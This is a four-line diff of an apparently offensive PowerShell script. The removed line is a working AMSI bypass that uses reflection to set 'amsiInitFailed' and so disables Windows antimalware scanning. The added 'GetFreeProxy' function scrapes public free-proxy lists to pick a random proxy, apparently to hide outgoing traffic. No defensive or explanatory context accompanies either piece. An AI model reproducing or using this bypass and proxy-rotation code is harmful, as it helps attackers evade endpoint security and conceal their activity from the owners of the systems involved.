@@ -1,1 +1,4 @@
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+function GetFreeProxy {
+    $freeProxies = @("http://free-proxy-list.net","http://www.sslproxies.org") | ForEach-Object { try { (Invoke-WebRequest $_ -UseBasicParsing).Content -match '\d+\.\d+\.\d+\.\d+:\d+' | Out-Null; $matches[0] } catch { "direct" } }
+    return $freeProxies | Get-Random
+}
